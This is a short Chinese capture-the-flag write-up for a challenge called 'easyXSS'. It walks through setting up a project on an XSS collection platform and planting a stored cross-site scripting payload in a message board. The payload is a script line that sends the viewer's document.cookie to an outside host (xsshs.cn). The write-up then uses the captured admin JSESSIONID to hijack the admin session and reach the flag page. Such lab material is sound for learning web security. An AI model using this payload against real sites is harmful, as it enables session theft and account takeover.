## easyXSS

首先到https://xsshs.cn/注册一个账号，然后创建一个项目并勾选**默认模块**：

![image-20210215223054127](https://gitee.com/Lieutenantas/md-pic/raw/master/20210228234602.png)

点右上角的查看代码，找到最下面的图片链接。记住这个链接，等会儿会用到。

![image-20210215223249132](https://gitee.com/Lieutenantas/md-pic/raw/master/20210228234606.png)



在题目的注册界面注册任意一个账号，接下来登录进入到留言板，在留言板中添加下述留言（这里href的内容就使用刚刚在xss平台申请项目中的那个图片链接）：

```
<script>window.location.href="https://xsshs.cn/rZTR/xss.jpg?"+document.cookie</script>
```

![image-20210215230049541](https://gitee.com/Lieutenantas/md-pic/raw/master/20210228234608.png)

这段代码能够让管理员每次查看该页面时携带cookie跳转到指定的链接。

添加留言后，等待至多五分钟，当管理员查看该页面后，在xss平台上就能够看到管理员的cookie：

![image-20210215230503335](https://gitee.com/Lieutenantas/md-pic/raw/master/20210228234613.png)

接下来打开浏览器修改cookie JSESSIONID为管理员的cookie值即可查看flag页面：

![image-20210215230548135](https://gitee.com/Lieutenantas/md-pic/raw/master/20210228234619.png)


